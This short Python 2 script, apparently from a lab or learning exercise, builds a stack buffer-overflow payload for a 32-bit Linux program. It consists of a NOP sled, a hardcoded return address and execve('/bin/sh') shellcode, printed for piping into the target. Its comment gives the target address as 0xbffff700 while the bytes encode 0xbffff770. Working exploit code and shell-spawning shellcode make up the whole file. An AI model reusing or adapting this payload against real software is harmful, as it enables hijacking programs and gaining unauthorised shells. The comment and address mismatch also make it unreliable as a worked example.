#!/usr/bin/env python

# 
# x door 0xbffff6f8: 0xbffff7bc
# 0xbffff700 + 12 = 0xbffff70c => x/30x $esp mov instruction after call in disas main -> 0x0804842a
# 0xbffff70c - 0xbffff6f8 = 20 bytes


shellcode = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"

# 20 BYTES
buffer = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"

# 0xbffff6f8 + 8 = 0xbffff700 -> address of door plus 8 bytes
new_eip = "\x70\xf7\xff\xbf"

# necessary to do this?
buffer += new_eip

# 16 more bytes. So our malicious code doesn't crash. Arbitrary amount
buffer += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"

buffer += shellcode

print buffer
